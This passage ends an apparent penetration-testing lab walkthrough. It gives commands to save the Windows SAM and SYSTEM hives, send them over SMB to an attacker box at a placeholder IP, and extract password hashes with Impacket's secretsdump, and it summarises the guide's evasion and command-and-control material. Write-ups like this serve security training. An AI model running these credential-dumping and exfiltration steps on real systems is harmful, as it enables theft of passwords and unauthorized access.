![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965407669/e9f810e4-0723-4edb-bef2-b019598c45a4.png){: .center-image }

Extract `SYSTEM` hive:

```powershell
reg.exe save HKLM\SYSTEM system.bak
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965425148/70b53977-68cb-422c-9a19-a7c5a90112e7.png){: .center-image }

Now, we need to transfer these files back to our attacking device in order to extract the password hashes.

Start `smbserver`:

```bash
smbserver.py share . -smb2support -username user -password s3cureP@ssword
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965480830/f2a8575f-c176-4864-be04-cd9479643643.png){: .center-image }

Connect to the server from Thomas's PC:

```powershell
net use \\<ATTACK_BOX_IP>\share /USER:user s3cureP@ssword
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965541897/21e23636-0dee-4c58-9317-12c4b52aa391.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965545705/4d036d1d-a07a-483a-b0a4-41c9014210fc.png){: .center-image }

Now transfer the `sam.bak` and `system.bak` files.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965581514/8138cedd-0512-4767-83d2-81db8dc44c37.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965585790/d0daee73-a6de-4ce2-a1dd-9064a4f63e21.png){: .center-image }

Now, we can extract the hashes using `secretsdump.py` from `Impacket`:

```bash
python /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965636158/81111efc-fea4-453a-98cd-782c3b564bec.png){: .center-image }

## Summary

> In this comprehensive guide, the author demonstrates how to assess the security of a friend's home network, focusing on enumeration, exploitation, pivoting, command and control, antivirus evasion, and data exfiltration. The walkthrough includes the use of tools such as nmap, ffuf, WebMin, GitStack, PowerShell Empire, Starkiller, Chisel, and Mono, as well as techniques for bypassing security filters and evading antivirus detection. The guide is designed to take approximately 30 minutes to read and longer if following along while attempting to complete the tasks.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691965736997/ad230bb1-7e7a-4a19-848b-d32dc17adec0.png){: .center-image }